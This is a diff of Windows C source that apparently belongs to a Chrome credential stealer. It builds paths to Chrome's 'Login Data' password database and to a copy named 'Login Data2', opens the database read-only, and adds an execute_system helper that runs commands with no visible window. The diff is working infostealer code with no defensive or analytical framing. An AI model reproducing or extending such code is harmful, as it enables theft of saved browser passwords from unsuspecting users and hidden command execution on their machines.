@@ -144,6 +144,7 @@ BOOL get_file_explorer(PSTR chrome_dir, WIN32_FIND_DATAA* dir_files, HANDLE* dir
 BOOL open_database(PSTR chrome_dir_char, PSTR profile_name, void** handle_db, PSTR buf_outMsg, WORD buf_outSize) {
 	errno_t err;
 	int status;
+	CHAR copy_chrome_dir_char[MAX_PATH] = "\0";
 
 	if ((err = strcat_s(chrome_dir_char, MAX_PATH, "\\")) != 0) {											// Apend '\\' to the end of chrome_dir_char to make the path for Login Data file for a specific user profile
 		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending '\\\\' to chrome_dir_char error: %d\n", err);)
@@ -153,9 +154,17 @@ BOOL open_database(PSTR chrome_dir_char, PSTR profile_name, void** handle_db, PS
 		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending '%s' to chrome_dir_char error: %d\n", profile_name, err);)
 		return FALSE;
 	}
+	if ((err = strcat_s(copy_chrome_dir_char, MAX_PATH, chrome_dir_char)) != 0) {									// Append '\Login Data' to end of chrome_dir_char
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Initializing copy_chrome_dir_char error: %d\n", err);)
+			return FALSE;
+	}
 	if ((err = strcat_s(chrome_dir_char, MAX_PATH, "\\Login Data")) != 0) {									// Append '\Login Data' to end of chrome_dir_char
 		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending 'Login Data' to chrome_dir_char error: %d\n", err);)
 		return FALSE;
+	}
+	if ((err = strcat_s(copy_chrome_dir_char, MAX_PATH, "\\Login Data2")) != 0) {									// Append '\Login Data2' to end of chrome_dir_char
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending 'Login Data2' to copy_chrome_dir_char error: %d\n", err);)
+			return FALSE;
 	}
 
 	if ((status = sqlite3_open_v2(chrome_dir_char, (sqlite3**)handle_db, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK) {	// Opens the connection to database
@@ -199,6 +208,7 @@ int get_result_size(void* handle_sql_stmt, int index) {
 	return sqlite3_column_bytes((sqlite3_stmt*)handle_sql_stmt, index);
 }
 
+// Close database connection
 BOOL close_database(void* handle_db, void* handle_sql_stmt, PSTR buf_outMsg, WORD buf_outSize) {
 	/* Reset SQL statement */
 	NTSTATUS status;
@@ -210,4 +220,25 @@ BOOL close_database(void* handle_db, void* handle_sql_stmt, PSTR buf_outMsg, WOR
 	/* Close the opened database */
 	sqlite3_close((sqlite3*)handle_db);
 	return TRUE;
+}
+
+// Executes system command
+BOOL execute_system(LPCWSTR command) {
+	STARTUPINFOW si;
+	PROCESS_INFORMATION pi;
+
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+
+	if (CreateProcessW(command, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+		WaitForSingleObject(pi.hProcess, INFINITE);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return TRUE;
+	}
+	else {
+		return FALSE;
+	}
+	
 }
